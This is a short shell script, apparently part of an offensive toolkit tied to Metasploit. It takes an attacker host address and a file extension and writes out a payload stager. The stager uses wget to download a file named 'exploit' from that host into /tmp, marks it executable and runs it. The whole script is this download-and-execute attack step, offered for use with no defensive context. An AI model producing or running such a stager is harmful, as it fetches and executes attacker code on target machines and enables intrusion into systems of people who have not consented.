LHOST="$1"
EXT="$2"
SCRIPT="exploit.${EXT}"
FILE="${HOME}/.emacs.d/sh4hack/msf.sh"

if [ -z "$LHOST" ] || [ -z "$EXT" ]; then
    echo "Lhost and extension are required.";
    exit 1;
fi

cat > $FILE <<- EOM
wget http://${LHOST}/${SCRIPT} -O /tmp/${SCRIPT};
chmod +x /tmp/${SCRIPT};
/tmp/${SCRIPT};
EOM


